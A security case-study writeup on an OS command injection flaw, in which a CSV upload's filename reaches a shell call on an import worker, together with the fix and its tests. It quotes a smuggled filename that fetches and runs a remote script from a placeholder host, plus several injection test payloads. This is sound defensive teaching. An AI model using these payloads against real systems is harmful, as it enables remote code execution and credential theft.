# 043 · A CSV upload named "orders.csv; curl … | sh" ran the attacker's script on the import worker

## Problem
A B2B invoicing platform lets customers bulk-import orders by uploading CSV
files (about 20,000 uploads a day). Before queuing an import, a worker shows
the row count by running `wc -l <filename>` with Python's
`subprocess.run(command, shell=True)`, where `<filename>` is the customer's
original upload name.

A security researcher uploaded a file named
`orders.csv; curl -s https://<their host>/x | sh`. The shell ran `wc`,
then downloaded and ran the script. The worker had read access to every
tenant's upload bucket and the database credentials in its environment, so
the report was rated critical. The same code also produced wrong counts for
honest customers: a file called `q3 report.csv` printed `0 total`, because
the shell split it into two missing files, `q3` and `report.csv`.

## Root cause
**OS command injection (CWE-78).** Building a command as one string and
handing it to `/bin/sh` means the data is parsed as shell syntax. `;`, `|`,
`||`, `&&`, `$( )`, backticks, quotes and spaces in the filename all change
what runs. A second, quieter flaw is **argument injection (CWE-88)**: even a
name with no shell characters, such as `--version`, is read by `wc` as an
option (the naive code prints `wc (GNU coreutils) …` instead of a count).

Escaping or blocklisting characters is a common but fragile fix: the set of
special characters differs between shells, and real customers do upload
names like `Q3; final.csv`.

## Solution
`solution.py` keeps `naive_count_lines` and adds `safe_count_lines`:

1. **No shell.** `subprocess.run([...], shell=False)` passes the program
   and each argument straight to the operating system, so the filename is
   one argument whatever it contains. Nothing in it is ever parsed.
2. **`--` before the filename** ends option parsing, so `--version` is read
   as a file name.
3. **Path checks:** names containing `/`, `\` or a NUL byte, `.`, `..`, the
   empty string and names over 255 characters are refused with
   `UnsafeFilenameError`, so the worker only touches files in its upload
   directory. Shell characters are deliberately *allowed*: without a shell
   they are harmless.
4. **Fail loudly:** a non-zero exit or output that is not a number raises
   `LineCountError` instead of showing a made-up count. A timeout bounds the
   call.

The tests run the real `sh` and `wc` in a temporary directory: each of five
payloads (`;`, `$( )`, backticks, `|`, `||`) creates a marker file with the
naive code and nothing with the fix; files really named
`orders.csv; touch INJECTED`, `Q3 'final' "v2".csv` and `--version` are
counted correctly (3 lines).

## Trade-offs
- The best fix is not to start a process at all: counting lines in Python
  (or using a library instead of a CLI tool) removes the risk completely.
  `wc` stands in here for tools that have no library equivalent, such as
  `ffprobe` or `libreoffice --convert-to`.
- Storing uploads under a server-generated name (e.g. a UUID) and keeping
  the customer's name only as display metadata removes filename tricks for
  every later tool too; this is what we would do next.
- `--` is a convention most Unix tools follow but not all; check each tool.
  Some tools also interpret file *contents* or special name prefixes (for
  example `ffmpeg` accepts URLs as inputs), which argument lists do not fix.
- Run such workers with least privilege (no credentials they do not need,
  no outbound network) so a missed injection is not a full compromise.
- The tests need a Unix-like system with `sh` and GNU or BSD `wc`.

## Run
```bash
python -m unittest -v test_solution.py
```
